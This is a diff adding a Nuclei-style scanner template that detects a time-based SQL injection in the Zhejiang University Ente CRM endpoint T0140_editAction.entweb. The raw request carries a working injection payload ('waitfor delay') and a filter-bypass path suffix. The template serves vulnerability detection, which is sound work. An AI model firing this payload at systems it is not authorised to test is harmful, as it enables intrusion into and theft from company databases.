@@ -1,0 +1,26 @@
+id: zjuedu-documentnum-sqli
+
+info:
+  name: zjuedu-documentnum-sqli
+  author: apple
+  severity: high
+  description: 浙大恩特客户资源管理系统中的T0140_editAction.entweb接口存在SQL注入漏洞，攻击者可通过此漏洞获取企业数据库内数据，威胁其他数据安全。
+  reference:
+    - https://mp.weixin.qq.com/s/VT5LIUiyPJ6DnMAUxXwXTg
+  tags: zjedu
+
+http:
+  - raw:
+      - |-
+        GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1';waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
